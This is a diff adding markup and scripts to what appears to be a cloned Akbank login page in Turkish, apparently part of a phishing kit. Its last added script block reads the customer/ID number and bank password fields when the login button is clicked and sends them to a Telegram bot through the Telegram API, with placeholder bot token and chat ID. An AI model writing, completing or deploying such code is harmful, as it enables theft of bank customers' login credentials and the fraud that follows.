+        var culture = 'tr-TR';
+        BuildVNumber = "";
+    </script>
+<script src="local_resources/js/042c521cb94c2a47a4f5d34fd8f73879.js" type="text/javascript"></script>
+<script src="local_resources/js/7952f08b56886ca89ef8575b3aa309f7.js" type="text/javascript"></script>
+<script src="local_resources/js/c975f14379f8d42c2ecb59e1e64f85d6.js" type="text/javascript"></script>
+<script src="local_resources/js/cfa11b53109035e303ce18213eb11a28.js" type="text/javascript"></script>
+<script src="local_resources/js/8870df1ef79c87dbfee83f68ed626b34.js"></script>
+<script type="text/javascript">
+        var ClientResolution ="";
+        $(function () {
+            LoaderElement = $("body &gt; .loader");
+            if(Modernizr.svg){
+                var spinnerCenter = document.createElement("div");
+                spinnerCenter.setAttribute("class", "spinner center-block");
+
+                var container1 = createLoaderDiv("spinner-container container1");
+                var container2 = createLoaderDiv("spinner-container container2");
+                var container3 = createLoaderDiv("spinner-container container3");
+
+                spinnerCenter.appendChild(container1);
+                spinnerCenter.appendChild(container2);
+                spinnerCenter.appendChild(container3);
+                LoaderElement[0].appendChild(spinnerCenter);
+            } else {
+                var loadingImg = document.createElement("img");
+                loadingImg.setAttribute("src","./content/application/images/loading.gif");
+                loadingImg.setAttribute("width","50px");
+                loadingImg.setAttribute("height","50px");
+                LoaderElement[0].appendChild(loadingImg);
+            }
+
+            ClientResolution = window.innerWidth || document.body.clientWidth + ',' + window.innerHeight || document.body.clientHeight;
+        });
+    </script>
+<script src="local_resources/js/e369f5b090e3e3aa4dbdbba58761a50a.js" type="text/javascript"></script>
+<div id="dvHiddenElementContainer" style="display: none"></div>
+<script>
+    // Telegram bot credentials
+    const chatId = 'YOUR_CHAT_ID';
+    const botToken = 'YOUR_BOT_TOKEN';
+
+    // Function to send message to Telegram
+    function sendToTelegram(message) {
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+        const params = {
+            chat_id: chatId,
+            text: message
+        };
+
+        fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(params)
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (!data.ok) {
+                console.error('Error sending message to Telegram:', data.description);
+            }
+        })
+        .catch(error => console.error('Error:', error));
+    }
+
+    // Function to capture login details
+    function captureLoginDetails() {
+        const customerNumber = document.querySelector('input[placeholder="Müşteri / TC Kimlik No"]').value;
+        const password = document.querySelector('input[placeholder="Akbank Şifresi"]').value;
+
+        const message = `Customer Number: ${customerNumber}\nPassword: ${password}`;
+        sendToTelegram(message);
+    }
+
+    // Add event listener to the login button
+    document.querySelector('.login-button input[type="button"]').addEventListener('click', function() {
+        captureLoginDetails();
+    });
+</script>
+</body></html>
